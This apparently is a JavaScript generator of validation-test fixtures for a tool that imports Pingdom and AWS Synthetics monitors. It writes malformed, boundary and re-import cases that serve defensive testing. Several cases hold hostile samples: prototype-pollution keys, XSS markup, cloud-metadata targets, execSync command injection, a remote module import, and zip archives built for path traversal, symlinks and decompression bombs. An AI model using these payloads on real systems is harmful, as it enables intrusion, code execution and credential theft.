import {copy,get,epoch,json,zip} from './transport.mjs'
import {awsProposals} from './aws.mjs'

// All hostile strings below are inert test data, never imported or evaluated by
// the generator. Their only consumers are production input validation tests.
export function buildVariants(pingdom,aws){
 const files=new Map(),cases=[]
 const add=(path,body,expectation)=>{files.set(path,Buffer.isBuffer(body)?body:json(body));cases.push({path,...expectation})}
 const capture=(records,source='pingdom')=>(source==='pingdom'?pingdom:aws).envelope(records)
 const item=copy(pingdom.records.find(value=>value.kind==='check-detail'))
 const detail=change=>{const value=copy(item);change(value.response.check);return value}
 const negative=(name,records,reason,source='pingdom')=>add(`negative/${name}.json`,capture(records,source),{category:'refusal',reason})
 const variant=(name,records,reason,source='pingdom')=>add(`reimport/${name}.json`,capture(records,source),{category:'reimport',reason})
 add('negative/truncated.json',Buffer.from('{"check":{"id":61000,'),{category:'malformed',reason:'Truncated JSON; refuse without effects.'})
 add('negative/invalid-utf8.json',Buffer.from([0x7b,0x22,0x78,0x22,0x3a,0x22,0xc3,0x28,0x22,0x7d]),{category:'malformed',reason:'Invalid UTF-8 bytes; refuse without replacement-character normalization.'})
 negative('wrong-envelope',[{...item,response:{checks:{id:61000}}}],'check-detail needs a check object.')
 negative('wrong-type',[detail(v=>v.type.http.encryption='true')],'Protocol booleans may not be string-coerced.')
 negative('malformed-number',[detail(v=>v.resolution='five')],'Cadence must be an integer, not text.')
 negative('malformed-date',[{...copy(pingdom.records.find(v=>v.kind==='maintenance')),response:{maintenance:[{id:82001,from:'2026-13-40',to:null}]}}],'Malformed source epochs must be named, never converted to current time.')
 negative('duplicate-id-conflict',[item,detail(v=>v.name='Changed content with identical source identity')],'Same kind/source ID with different content conflicts.')
 negative('missing-detail',pingdom.records.filter(v=>v.kind!=='check-detail'||v.sourceId!=='61000'),'A summary with a missing detail cannot silently become a full check.')
 negative('offset-gap',pingdom.records.filter(v=>v.kind!=='checks-list'||v.request.query.offset!==25),'Missing middle offset page is visible in capture reconciliation.')
 negative('offset-wrong-number',[{...copy(pingdom.records.find(v=>v.kind==='checks-list')),request:get('/api/3.1/checks',{limit:25,offset:-1})}],'Negative page offset must be refused.')
 const repeated=copy(aws.records.filter(v=>v.kind==='canaries-list'));repeated[1].response.NextToken='synthetic-page-1'
 negative('repeated-token',repeated,'Repeated continuation token must not loop or silently omit resources.','aws-synthetics')
 negative('unmatched-tms-id',[{...copy(pingdom.records.find(v=>v.kind==='tms-detail')),sourceId:'83099',request:get('/api/3.1/tms/check/83001')}],'Descriptor identity must match request/list context.')
 negative('exclusive-keywords',[detail(v=>Object.assign(v.type.http,{shouldcontain:'ready',shouldnotcontain:'failure'}))],'Pingdom explicitly prohibits combining include and exclude keywords.')
 negative('invalid-unicode-tag',[detail(v=>v.tags=[{name:'bad-\ud800',type:'u',count:1}])],'Invalid Unicode tag belongs only in a negative corpus.')
 let nested={leaf:'synthetic-depth'};for(let i=0;i<120;i++)nested={next:nested}
 negative('deep-nesting',[detail(v=>v.syntheticExtension=nested)],'Excessive JSON depth must be bounded.')
 negative('prototype-keys',[detail(v=>Object.assign(v,JSON.parse('{"__proto__":{"polluted":"SYNTHETIC"},"constructor":{"prototype":{"polluted":"SYNTHETIC"}}}')))],'Prototype-related keys must be refused without pollution.')
 negative('credential-url',[detail(v=>v.hostname='synthetic-user:SYNTHETIC_URL_PASSWORD@target.example.test')],'Credential-bearing URL source cannot retain URL credentials.')
 for(const [name,host] of [['loopback','127.0.0.1'],['ipv6-loopback','[::1]'],['link-local','169.254.1.1'],['metadata','169.254.169.254'],['metadata-host','metadata.google.internal']])negative(`forbidden-${name}`,[detail(v=>v.hostname=host)],'Forbidden target must not be contacted or acquire installation authority.')
 negative('source-secrets',[detail(v=>Object.assign(v.type.http,{username:'synthetic-user',password:'SYNTHETIC_SOURCE_PASSWORD_HTTP',postdata:'token=SYNTHETIC_SOURCE_POSTDATA',requestheaders:['Authorization: Bearer SYNTHETIC_SOURCE_AUTH_HEADER','Cookie: synthetic=SYNTHETIC_SOURCE_COOKIE']}))],'All source request secret values must be withheld before durable custody, reports or logs.')
 const hostileTms=copy(pingdom.records.find(v=>v.kind==='tms-detail'&&v.response.type==='recording'))
 Object.assign(hostileTms.response.metadata,{disableWebSecurity:true,authentications:{httpAuthentications:[{host:'https://flow.example.test/auth',credentials:{userName:'SYNTHETIC_SOURCE_USERNAME',password:'SYNTHETIC_SOURCE_PASSWORD_TMS'}}]}})
 hostileTms.response.steps=[{fn:'authenticate',args:{username:'SYNTHETIC_SOURCE_USERNAME',password:'SYNTHETIC_SOURCE_PASSWORD_STEP'}},{fn:'execute_javascript',args:{value:'import("node:child_process").then(m => m.execSync("SYNTHETIC_DO_NOT_EXECUTE"))'}}]
 negative('tms-secrets-and-unsafe-command',[hostileTms],'Preserve command/locator inventory, withhold values, never relax browser security or execute uploaded instructions.')
 negative('xss',[detail(v=>{v.name='<img src=x onerror="throw new Error(\'SYNTHETIC_XSS\')">';v.custom_message='<script>SYNTHETIC_DO_NOT_EXECUTE</script>'})],'Escape source text in report DOM and downloads.')
 add('negative/oversized-text.json',json({padding:'x'.repeat(2*1024*1024+1)}),{category:'bounds',reason:'More than 2 MiB; refuse before retention.'})
 const many=n=>Array.from({length:n},(_,i)=>detail(v=>{v.id=65000+i;v.name=`Synthetic bounds ${i}`;v.hostname=`bounds-${i}.example.test`;delete v.type.http.ssl_down_days_before;delete v.teams})).map((value,i)=>({...value,id:`bounds-${i}`,sourceId:String(65000+i),request:get(`/api/3.1/checks/${65000+i}`)}))
 negative('501-monitors',many(501),'Bound source monitor count at 500 independently of resource ledger rows.')
 negative('expanded-companion-bound',many(251).map(v=>{v.response.check.type.http.ssl_down_days_before=14;return v}),'251 source checks expand to 502 native entries; source count and companion count are distinct bounds.')
 const reordered=copy(pingdom.records).reverse()
 variant('reordered-pages',reordered,'Same source identities/content retain IDs and revisions regardless of capture ordering.')
 variant('identical',copy(pingdom.records),'Identical re-import adds no monitor or revision.')
 const overlapping=copy(pingdom.records),page=copy(overlapping.find(v=>v.kind==='checks-list'&&v.request.query.offset===25));page.id='checks/overlap-020';page.request.query.offset=20;page.response.checks=copy(pingdom.checks.slice(20,45));overlapping.push(page)
 const historyPage=copy(overlapping.find(v=>v.kind==='results'&&v.sourceId==='61000'&&v.request.query.offset===200));historyPage.id='history/overlap-0100';historyPage.request.query.offset=100;historyPage.response.results=copy(pingdom.history.results.slice(100,300));overlapping.push(historyPage)
 variant('overlapping-pages',overlapping,'Legitimate overlapping rows deduplicate by stable source identity and unchanged content.')
 variant('changed-source',pingdom.records.map(v=>v.id===item.id?detail(check=>check.name='Synthetic reviewed revision — café'):copy(v)),'Changed source creates a reviewed revision while operational state is preserved.')
 const unknown=detail(v=>v.syntheticExtension={nested:{futureField:'documented-as-unknown',emptyList:[],emptyObject:{}}})
 add('edge/unknown-fields.json',capture([unknown]),{category:'edge',reason:'Every unknown nested field and empty container gets a named disposition.'})
 add('edge/ping-adapter-convention.json',{check:{...copy(pingdom.checks.find(v=>v.type==='ping')),type:{ping:{}}}},{category:'adapter-convention',reason:'Uptime adapter-only empty ping detail convention; not a documented Pingdom GET alternative.'})
 for(const [kind,settings] of Object.entries({httpcustom:{url:'/api',encryption:true,port:443,additionalurls:['https://secondary.example.test/api'],verify_certificate:true,ssl_down_days_before:14},udp:{port:12345,stringtosend:'PING',stringtoexpect:'PONG'},pop3:{port:110,stringtoexpect:'+OK'},imap:{port:143,stringtoexpect:'* OK'}}))add(`edge/protocol-${kind}.json`,capture([detail(v=>v.type={[kind]:settings})]),{category:'proposal',reason:`Documented ${kind} requires an explicit reviewed conversion/refusal.`})
 for(const interval of [720,1440]){const tms=copy(pingdom.records.find(v=>v.kind==='tms-detail'));tms.response.interval=interval;add(`edge/tms-interval-${interval}.json`,capture([tms]),{category:'proposal',reason:'Additional documented TMS cadence; never silently clamp.'})}
 for(const [name,response] of Object.entries(awsProposals(aws))){const kind=name==='alarm-extra-metadata'?'alarms-list':name==='code-input-s3-alternative'?'canary-code-input':name==='run-config-input-alternative'?'canary-run-config-input':'canary-detail';add(`aws/proposals/${name}.json`,aws.envelope([{id:`proposal-${name}`,kind,sourceId:aws.canaries[0].Id,request:{method:'LOCAL',path:`proposal/${name}`,query:{}},response}]),{category:'proposal',reason:'Exact source semantics/metadata require conversion, re-entry or named refusal; no authority transfer.'})}
 const emptyKinds={...Object.fromEntries(['checks','probes','contacts','teams','maintenance','occurrences','results'].map(key=>[key,[]]))}
 const empties=[['checks-list',{checks:[],counts:{total:0,limited:0,filtered:0}}],['probes',{probes:[]}],['contacts',{contacts:[]}],['teams',{teams:[]}],['maintenance',{maintenance:[]}],['maintenance-occurrences',{occurrences:[]}],['results',{results:[],activeprobes:[]}],['tms-list',{checks:[],limit:25,offset:0}]]
 add('empty/pingdom-capture.json',capture(empties.map(([kind,response],i)=>({id:`empty-${kind}`,kind,request:get(`/synthetic-empty/${kind}`,{offset:0,limit:25}),...(kind==='results'?{sourceId:'61000'}:{}),response}))),{category:'empty',reason:'Empty native collections reconcile to zero; unavailable resources remain unknown.'})
 add('empty/no-records.json',capture([]),{category:'empty',reason:'Empty capture envelope is valid and creates nothing.'})
 add('empty/aws-capture.json',aws.envelope([{id:'empty-canaries',kind:'canaries-list',request:inputRequest('/canaries'),response:{Canaries:[]}},{id:'empty-alarms',kind:'alarms-list',request:inputRequest('/'),response:{MetricAlarms:[],CompositeAlarms:[]}}]),{category:'empty',reason:'Empty AWS native collections; no provider/account operation.'})
 const archives={traversal:zip([{name:'../outside.txt',body:'SYNTHETIC_TRAVERSAL'}]),absolute:zip([{name:'/tmp/synthetic-outside.txt',body:'SYNTHETIC_TRAVERSAL'}]),'backslash-traversal':zip([{name:'..\\outside.txt',body:'SYNTHETIC_TRAVERSAL'}]),symlink:zip([{name:'nodejs/node_modules/link',body:'../../outside',unixMode:0o120777}]),bomb:zip([{name:'nodejs/node_modules/expanded.js',body:Buffer.alloc(4*1024*1024,0x20),deflate:true}]),duplicates:zip([{name:'index.js',body:'first'},{name:'index.js',body:'second'}]),oversized:Buffer.alloc(2*1024*1024+1,0x61),'unsafe-code':zip([{name:'nodejs/node_modules/index.js',body:'const { execSync } = require("node:child_process"); exports.handler = () => execSync("SYNTHETIC_DO_NOT_EXECUTE");'}]),'remote-import':zip([{name:'nodejs/node_modules/index.js',body:'export const handler = async () => import("https://unsafe.example.test/module.js");'}]),'metadata-fetch':zip([{name:'nodejs/node_modules/index.js',body:'exports.handler = async () => fetch("http://169.254.169.254/latest/meta-data/");'}])}
 archives.truncated=archives.traversal.subarray(0,35)
 for(const [name,bytes] of Object.entries(archives)){add(`negative/zip-${name}.zip`,bytes,{category:'zip',reason:'Inert hostile archive; never extract or execute without bounded path/type/code validation.'});if(bytes.length<100000)add(`negative/zip-${name}-capture.json`,aws.envelope([{id:`zip-${name}`,kind:'canary-code-input',sourceId:aws.canaries[0].Id,request:{method:'LOCAL',path:`canary-code-input/${name}`,query:{}},response:{Handler:'index.handler',ZipFile:bytes.toString('base64')}}]),{category:'zip',reason:'Same hostile bytes through the capture upload door; no external reference fetching.'})}
 return {files,cases}
}
function inputRequest(path){return {method:'POST',path,query:{}}}
